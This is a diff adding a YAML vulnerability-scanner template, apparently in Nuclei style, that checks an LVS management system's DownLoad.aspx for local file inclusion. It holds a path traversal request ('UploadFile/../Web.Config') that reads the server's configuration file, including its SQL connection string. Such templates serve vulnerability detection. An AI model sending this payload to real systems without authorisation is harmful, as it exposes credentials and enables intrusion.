@@ -1,0 +1,30 @@
+id: lvs-download-lfi
+brief:
+    title: LVS DownLoad.aspx - Local File Inclusion (LFI)
+    by: pussycat0x
+    level: high
+    about: LVS lean value management system DownLoad.aspx has an arbitrary file reading vulnerability.
+    label:
+        - lvs
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Business/DownLoad.aspx?p=UploadFile/../Web.Config'
+      signs:
+        - "on": word
+          has:
+            - <configuration>
+            - <appSettings>
+            - <add key="SqlConnString"
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/ms-excel
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
